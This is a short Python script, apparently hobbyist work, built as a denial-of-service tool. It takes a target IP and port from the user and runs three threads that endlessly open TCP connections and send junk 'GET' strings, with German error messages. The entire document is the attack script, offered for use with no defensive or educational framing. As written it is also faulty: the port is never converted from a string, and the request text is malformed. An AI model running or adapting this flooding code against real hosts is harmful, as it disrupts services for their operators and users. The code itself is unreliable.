import socket
from threading import Thread

print("IPv4 or address")
ip = input("IP: ")
port = input("Port ")
ipv4 = socket.gethostbyname(ip)

def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET" + "hast du drei euro für mich" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET" + "hast du drei euro für mich" + "HTTP/1.1 \r\n"), (ip, port))
        except socket.error:
            print("Es kann keine Verbinfung zum Zielhost hergestellt werden\n")
        mysocket.close()

for i in range(3):
    t = Thread(target=dos)
    t.start()
